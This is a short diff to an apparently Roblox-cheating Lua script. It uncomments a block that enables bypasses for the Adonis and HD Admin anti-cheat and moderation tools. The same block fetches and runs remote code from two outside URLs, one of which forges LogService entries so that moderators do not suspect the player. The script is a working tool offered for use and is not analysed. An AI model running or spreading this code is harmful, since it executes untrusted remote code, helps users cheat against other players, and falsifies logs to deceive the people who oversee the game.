@@ -102,7 +102,7 @@ for i, v in ipairs(bgames) do
 end
 
 -- Hooks and detects Adonis and HD admin on its own
---[[ His site down for some reason
+
 getgenv()["AntiCheatSettings"] = {};
 getgenv()["AntiCheatSettings"]["Adonis"] = true;
 getgenv()["AntiCheatSettings"]["HD Admin"] = true;
@@ -111,4 +111,3 @@ loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/Bypasses.lua"))()
 
 -- =This just replaces the log entries in LogService with believeable ones so moderators don't suspect you when looking at them.
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Logs.lua"),true))()
-]]
